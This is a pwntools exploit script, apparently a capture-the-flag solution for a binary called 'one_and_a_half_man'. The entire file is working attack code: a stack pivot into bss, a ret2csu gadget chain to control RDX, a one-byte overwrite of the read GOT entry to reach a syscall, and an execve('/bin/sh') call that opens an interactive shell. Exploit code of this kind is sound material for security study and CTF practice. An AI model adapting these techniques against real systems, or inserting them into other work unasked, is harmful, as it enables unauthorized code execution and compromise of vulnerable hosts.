from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'one_and_a_half_man'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
offset = 18

bss = 0x601068
leave_r = 0x004005db #: leave ; ret ;
pop_rdi = 0x00400693 #: pop rdi ; ret  ;
pop_rsi = 0x00400691 #: pop rsi ; pop r15 ; ret  ;
mov_r14 = 0x00400670
add_rbp = 0x00401108
pop_r45 = 0x00400690 #: pop r14 ; pop r15 ; ret  ;
csu = 0x040068A
init = 0x600e38 # -> _init
ret = 0x0040062d

p = "A"*10
p += p64(bss)
p += p64(pop_rsi)
p += p64(bss+8)
p += p64(0)
p += p64(elf.symbols['read'])
p += p64(leave_r)

s(p)
pause()

# control RDX to 0x1000 call read again
p = p64(csu)
p += p64(0)
p += p64(1)
p += p64(init)
p += p64(0)
p += p64(0) #r14 rsi
p += p64(0x1000) #r15 rdx
p += p64(mov_r14)

p += p64(0)*2
p += p64(bss) #rbp
p += p64(0)*4

p += p64(pop_rsi)
p += p64(bss+0x98)
p += p64(0)
p += p64(elf.symbols['read'])
p += p64(leave_r)


s(p)
pause()

p = "/bin/sh\x00"

p += p64(pop_rsi)
p += p64(elf.got['read'])
p += p64(0)
p += p64(elf.symbols['read']) #1 ubah got read ke syscall least byte

#set RDX to bss+300 
p += p64(csu)
p += p64(0)
p += p64(1)
p += p64(init)
p += p64(0)
p += p64(0) #r14 rsi
p += p64(bss+0x300) #r15 rdx
p += p64(mov_r14)
p += p64(0)*7

#set rax 0x3b (exeve)
p += p64(pop_rsi)
p += p64(bss+0x300)
p += p64(0)
p += p64(elf.symbols['read']) #2


#syscall execve binsh
p += p64(pop_rdi)
p += p64(bss+0x98) #/bin/sh
p += p64(pop_rsi)
p += p64(bss+0x308) #0
p += p64(0)
p += p64(elf.symbols['read']) #syscall


s(p)
pause()
print "Now"

s("\xb0") #1
pause()

p = p64(0)
p += p64(bss+0x310)
p += "\x00"*43
s(p) #2

xp.interactive()
